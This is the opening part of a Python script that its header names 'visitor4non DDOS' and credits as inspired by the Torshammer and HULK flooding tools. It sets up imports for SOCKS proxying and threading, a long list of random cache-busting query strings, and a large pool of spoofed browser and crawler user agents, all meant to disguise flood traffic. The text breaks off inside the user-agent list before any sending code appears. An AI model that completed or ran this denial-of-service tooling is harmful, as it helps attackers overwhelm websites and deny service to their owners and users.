#!/usr/bin/python
# what about this visitor4non ddos:
# inspire from Torshammer (https://github.com/dotfighter/torshammer)  ddos & HULK ddos (https://github.com/praisekekboi/hulk)
# - Random User-Agent, Referer, Accept-Charset, Content-Length, Content-Type and more

import os
import re                                                       #####################
import time                                                     #                   #
import sys                                                      # visitor4non DDOS  #
import random                                                   # by- rouze-d       #
import math                                                     #                   #
import getopt                                                   #####################
import socks
import string
import optparse
import threading
import urllib
import urllib2
import urlparse
import string, random

from threading import Thread

GREEN = '\033[32m'
WHITE = '\033[0m'
RED = '\033[91m'
BLUE = '\033[94m'

SysCls = 'clear'

global stop_now
global term

stop_now = False
#term = terminal.TerminalController()

head = [
#'POST',
'GET'
]

para = [
"?a7NdDofh9Sq0H",
"?TCRqI9ZsgSA4l3yXGWP2Vpvz5j",
"?WF1LyCwA3VeGvo",
"?USCxkzVfKs9dvWn7hAYr36QPuGqZl",
"?9Ix3ukvy0AS7dOWqFXG6KjeaZ4",
"?fJXBnKSsc0YVe94L1PUT8",
"?a2JCkhOSzYDI1sVgL",
"?fDwzGu9BCmnLjrK0tb2gOx",
"?oga1DjKdTQFcUYR9Wr8XMHn20fxei",
"?aS4HAPTL0MCu2ksVNj3",
"?ENBZFWYU0LurbwPDXhR",
"?2OxZYANRfB0ik6",
"?d9DQ5WuhGVriELvlcpUH",
"?0syf5aBbEdqXJQIknVLT",
"?hkLC2pzMAUBSFfD6VJu0y",
"?4N1uWyEfZvcQjB",
"?zadsLwn6kbZyP9f38Or5DtiXIoUp",
"?bq5UwJxuFZjehHAsE6TmYS",
"?8Jxq4RZnsTOwkFyN",
"?lVUtocrQk0Hu",
"?WvhgKXS8VUZDmaHTjf",
"?LfxGkKyMHhsXElr0iYd9tW7Ibnw",
"?zWArOfFk30tYVDnETPL",
"?JGxER2a4zcb6v8PNBIsCZKUnmeOY",
"?9IieEbSYwvZ1stqcJ4L02yVjUOuGA",
"?aPCk7v4j6qIwHW2Dsc09SldEuVr",
"?oIV4gtxna2BjUqWms6RKyPShL3",
"?vJiDY3GOx7mHTQfaFWjpy6",
"?eTcfNzoGxEhjwibMdI",
"?icp0GLTQYINVovWSfntqzCm5F",
"?BE79Mrw2GbYN84QfUSgI61eAPXjCDO",
"?FZi5YlIPEws01aBK",
"?hPmIjaVoDLxFQRuz2X7nd",
"?COMLsbYxdT1rvHEuXJNcgtahnkQj",
"?A9x3UYsniIocTPCVWNmSOHp",
"?FzGxk2D5V7XsgwdCo8AL3SyMa6h",
"?5xjTFuhH9mqPp",
"?0A6b4La2mHIyTVdfBw",
"?WUkLIVHtmrN5wqyJp7fBMc",
"?ifaoLgcFs3dDnC9eXqH25",
"?73qjEZeDPgtk8OVrfWyAnsNBJCLpv",
"?MhFoeavtGyx4lIskb3JA8Dw",
"?FAmnV8jHrQJtIczTlP905",
"?fOnmWVzSlLkX983QJNgP05csRDar",
"?2cpjEbQR9ixqUDkmX",
"?B8oliNHSqTR63",
"?QEKw9PTXv4ALeHDlF5NoWR6gyIBVn",
"?0KZQyVb87FkBsOXD9i5NrxpGT",
"?qsvXhYcnZ3DASKFuHdeRfNW5CGlQ9",
"?OzU1HWvbrYfEdwkTlD",
"?PWQOKq5BryaV8UE7ID6RGTNXm",
"?bvdc1N0QDKZM9IzSY85BGgj",
"?K5hjPCvYmS49oTQLbHOqwrn",
"?UY0hPrAXVjTkigFQKqBNzH4oOuMx",
"?Z1hmnk4xUjvrEb3GCu",
"?aLjqkIXe21h3R6lWv8txVQf0nr5O",
"?Qmanud8WBo5TIwl",
"?LtB7he3KSg5cOjJP6zXGVavqTNC",
"?AOxLQWmgzMdVe",
"?9G6xdYyTSfNcZ",
"?Gw4ILpC2F9v1N87aqZoMeQUKJ5Af",
"?EWSD0B5pa1iV4MoFJy",
"?ECR03MciKnDwqmFNLlV4uUf",
"?eGtATKZJa7Ud6uMHfwYLq2",
"?W2j5qnhBLK7OHcA9at",
"?OYLMc4CuztsUlEN1",
"?AoF9ie3qhJY2LUjtf",
"?b1OBXW50cnYGAPLd83kzHC",
"?2AsS3y9tFJlekNH0KMQdYwX8q4o",
"?wpGfAzXs68tn2hu",
"?dXhcfE4IeKG3mgipOQjTzsHyWJ0FB",
"?Ze6o1IwAnGJUzRtkDEWSB",
"?N0DoGlMaLYECf",
"?VcmNThfCXKMwsYk8O6v37e1tu4aiSl",
"?7khpR5AaqldVIf6BngG3x",
"?onuyDIUceKGYbCTqtQihWSBmlNPvk",
"?kpjwGfFJbgzsem",
"?Boa9OZTGLIqWz2l",
"?pOXzVmT7H1fhdNBLaAw6IPYCiZWkx5",
"?pROPVyZ7oX0frwexsjDzN",
"?c9XEgWwtKDa2Gd8AULes67ruTy",
"?2zOiUXPLjkZKwsFgbScJuaN",
"?ctHMXVFLp95wjPEK3",
"?F1JNMxzrh0TtIGZS9p3kolP8fjuU6",
"?yBxnSlTazMJP2wOrs5LpuYdW3",
"?9n2Cqhr0TUepH",
"?wk3JeWm6sL2lXrVoyY5",
"?h7vmtILorBTY30dz",
"?fNXpqSo0v95QiksgYGhHKnlJzrPUE",
"?d7t5kYMfxGQP6jKbSEiuVmrNFqs",
"?10wnVCfIgkA4Pzou2GsQd3F",
"?bumRBqk48Ds1SI0iVPocfGUx3HE",
"?UH2nP4k7YcT3BLg0iaAR",
"?QmvJ17YPRMIfhebDjxz",
"?PrwLvUfd3t5FWmeEgCMoNYyc6",
"?okTb6qFmNlEtxZKBDOU",
"?3olpCvGfY8rET",
"?WfY0yeTx5OCUvpKRSuimc",
"?IOYcCB4gmGVbSXkMjZFqTe",
"?NdUIbEFRoh2sSzi5K",
"?w7mNsQ19uo5HXaT2bGAetnhpxKS6",
"?vYFQC4DsVxz2kyp37SjIn",
"?0T758nZEF92h6SjgRxc4dVsqUpXN",
"?H72zja0rUDN91",
"?s7wYAoam4XCKc0rdtTOBbuVSJl2i",
"?1pyvgUwa2XcTz",
"?7kRbeLmyDF1sAcin",
"?97sXWJtSoMUudNAz6aG52g3yifBZvR",
"?h0JKRt8MG23layCpmVQBHXusoUZA",
"?LSQoWlBNfCEe2byzsFHc",
"?FewGMXUoWOgKqQdsV571TuAyL9",
"?GP61ac87YLHJjnh",
"?2zVKoC9TAZl78niGaL",
"?uFvbgotS9NVZA4wcpD1",
"?R1JwhZDVzdB3xbt",
"?xgCKwn5ameSD2huqXZTvE8",
"?ufPmAaV0lIGhvzKZQMwpqOHCN9Fr",
"?SnL2V8vsfeFHJBqdAEh5C",
"?16hJSunjOHAEQyBk38LIbstGp2fUF",
"?JDARHvPn3sOtS78NmCxb",
"?me01ADcqlB9xws2pYO6JLUo5",
"?5q1zcwZdvYOueGWE",
"?Zmy7Gh6aR9AkX4sWLUOD5Cq",
"?giCFHDlvUVxNhGoX8I7a9M2nrSjQym",
"?OiRS5ImjuNGF21Ez0VJxp7XqZ8",
"?2C0sFfYuOajKcv",
"?WZb64mjKLoA2xi8Ch3",
"?2WtNbB9LYjIdaweyJ5r",
"?qfljeSXKJ0Qo7VkTdw8scAbitvaFC",
"?3GYSJvI2rLwA79qeo01QC",
"?4xWRQZ1tNIhJEK",
"?tbAKJlr6uSFfj",
"?C463w9akJVIzZG",
"?iun3wSvfDLWEaqhYBMx89rc7p",
"?W6ugh4xdNBJyPRoFVX",
"?2LnjT4EbYlMvZ8h60s1QJiPtCmfcK",
"?ebSMRhBUEy7FAaICt8VXL9xfkD",
"?B2YTPCaIw7XtRqLpxSvZMlH",
"?YGMAatvSLRr9QBE5qo7pImX",
"?CLyf1qxDmub6VNApwW2FBgvZQo",
"?IfXeBOpoYjGyMTa2",
"?uBSbe9vIlDjYq6tM8ow1",
"?BnUDpO4YjdFIXE7q",
"?pWfr8YczAQqhm7XeU",
"?cG35qM2X9ypLTKaPZl8wA",
"?QiNncsA20RIUdPDuyoz3tBL9Cp1GVe",
"?qoOd9RtPIvk4QXKp7jiU",
"?kzgjSwAHh8R2Q",
"?7DLiE9YnuReSd8",
"?OkeTjXwn8m1Fb5c3RGSpsi2VMJDU",
"?lLjpQIYRTGNq7",
"?gZEDhY6uwHmny",
"?MCJxew4I879i5YDkEZKaPn",
"?nfHDCivmoaF53",
"?aNelwYLcOhQvATBEU4Is0b7uSDR8H5",
"?OVaFEliPGq3YCJp",
"?ne1pQSVEUBAlGi9fuPvq",
"?C94Vo650OPbraAy8g",
"?hatN2vnZ3iE69zxcARkrL0",
"?5He1tJcC8kiaxmMd6furGRwh2NUQ",
"?Ji61poRHu8DYw",
"?gEjt3FZf0q7oCv8PRLw4lJH91IXd",
"?EsT45OQBUmbMGfoRl6tZAz",
"?8PG2CZJR6oNwQfz4BeY",
"?0EcZQdDMWiqNCngHj16Bf9sILhbX",
"?dOK5znal6b8ptMoANjR0hGmXefHJ4",
"?o69ar0N8Epdhyz7WvFuSR",
"?kRqFwteNmjiLVg8SICEB1M",
"?rHvoS7FQswzlxaX1N",
"?0UVPyp5uJ9FworDfqtNkTxnKmidX",
"?W9ORyIKtxT8QpPqkCNEX6MF",
"?TEBHl7nZLgUWp2bVMy",
"?swfaKAoUERJZi",
"?L6ubIn12U0tqV3zmJRGolZ",
"?WKMkJ3d0RZXPjgfACS2vEVby",
"?XSH8Uuo3ap09PmnV",
"?sxhfJLUcnTItdPHwNrYQ8DzO7SRj1",
"?UihsJoOntb6CL4AFgRcj3yQWevmXq",
"?KLOnwp58tybFG973U2qBeIcN",
"?5P7LgbrupQUe8KCH4tjVMAf",
"?hOZJKpQSWnNwodlPA8igG",
"?rFWU5aPMgOikT",
"?zYmbMBWoG4QvR9nP",
"?q40T95fj2oF8sAvGMJILcRmh6",
"?et8Wn3B0q4SUpzsmDdJhVAo2M",
"?YteUnS9xC0lp5KPBD",
"?Gfk8PxNChwQVD2MZcLT3m",
"?YAHN4Z61UPVaKInXSxhEeTp2kbF",
"?2AIE9v7NLZOu6lWC",
"?GoknXjtMleFV30N76BIWvc85",
"?h4qiw5WPeEUIT7NuvHoApm2tnkD",
"?Mh8WpU1yKBic70m4eG",
"?Du7cvj2YSwpCJ1aI5K6nUOo",
"?8BIoqRVYWLZyfGzNMQC",
"?SgfFRmuyq90PMwoX468",
"?cD9AUEd0bPu2yaGQOpzCXl",
"?keHhdmw2fp3UogYIX756TuDB",
"?67qn9hHUKzcYdujpIZCMBxRiGFT",
"?JwmAOn8WpvQYPTUkRNc2oeDjL3y",
"?MSZ9FIwANjODhdzCPu",
"?1NLUZ9mizV0x75n3ukHsFg4dSPb",
"?6AdyO1IXDH40MbwSU3t5zTFvf",
"?8WZ9Xfv0gL7HJyt36TwidsIxDBcGR",
"?XNPW1gwphL6cBe",
"?OG2qk3zhVEoBAj09xa",
"?sTgw7cUX1rP0fhRjedxQZ8B3",
"?fudRFGI5NC6eaVgr",
"?FNTDRHv1iZzBKojP",
"?qTP4o8I5slHgiM9WhjZn7Cv",
"?lbD9m4SZopXtNH2sCy",
"?4JrWTXPKNfu93OSgVFcmR21ZlBevY",
"?IUabgeZdpDo8iL056kqYQJcnSWTv",
"?Un4MX5VfOo03mATsz9ucQEqZd",
"?mCYunMiBc9rb5qwPR8G",
"?AnHbgij2BfyZ71xXsR80GzT4JPe",
"?db2ykZmSETY3HlFJfz4uPNMwKR78",
"?AU0IuNxlZhMrkBqEzybJWTCi85",
"?Tj2Az6FfMLdHmJiSREuWs4o",
"?xF4izCYMjoUDZJOIAmBthVwQ81E5",
"?dk3yhN1sLAXVKbtE5r92z48u",
"?5g6lJmxcGz7hSf",
"?4aOoD587TWmkNrFE",
"?HsO4G5g6rhYn2CMXzvk",
"?gy7DstABnPCopYVkGxmeXOhw",
"?nlQ89jLVfX24iFqohdIw",
"?iGWkDjqlLsRBAx5rzwYEu",
"?uPlR76DHr9MzUbcV1BOk",
"?nil6CF1zg0NjUsELwqBWkSYI5KZ"
]


http = [
#'1.0',
'1.1'
]

useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; I9192 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
 "Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.3; SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.2.2; Galaxy S4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.4.2; en-us; SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile",
 "Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-30.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo A369i Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.3; D2305 Build/18.0.A.1.30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; LG-D802 Build/KOT49I.D80220c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; mobiistar touch BEAN 402c Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; XT1080 Build/SU4.21) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16",
 "Mozilla/5.0 (Linux; U; Android 4.3; en-ca; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.1.2; LG-F160L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; SonyC1505 Build/11.3.A.2.23) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; th-th; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Series40; Nokia2700c/09.98; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27",
 "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
 "Mozilla/5.0 (X11; Linux i686; rv:6.0.2) (Q7sip7ZS4Ba8FkDSOvRNleYM4KEG59V8+uT/RC1tW0U=) Gecko/20100101 Firefox/6.0.2",
 "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 925; ANZ892) like Gecko",
 "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925; ANZ892) like Gecko",
 "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17",
 "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/38.0.2125.59 Mobile/12A365 Safari/600.1.4",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22",
 "Mozilla/5.0 (iPod touch; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.7 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50",
 "Mozilla/5.0 (X11; CrOS x86_64 6158.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.108 Safari/537.36",
 "Guzzle/4.2.3 curl/7.35.0 PHP/5.5.9-1ubuntu4.4",
 "curl/7.30.0",
 "Mozilla/5.0 (Linux ia32) node.js/0.10.32 v8/3.14.5.9",
 "Mozilla/5.0 (compatible; Googlebot/4.1; en-US rv:9.3.7) Firefox/32.5",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)",
 "AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)",
 "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)",
 "Gecko/20100101 Firefox/5.0.1",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) ",
 "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en)",
 "Presto/2.9.168 Version/11.50",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)",
 "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
 "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/)",
 "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
 "zspider/0.9-dev http://feedback.redkolibri.com/",
 "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
 "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
 "TheSuBot/0.2 (www.thesubot.de)",
 "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
 "Mozilla/4.0 (compatible: FDSE robot)",
 "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable)",
 "Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable)",
 "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
 "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
 "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0)",
 "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
 "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
 "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
 "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
 "NetResearchServer/4.0(loopimprovements.com/robot.html)",
 "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
 "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET) ",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
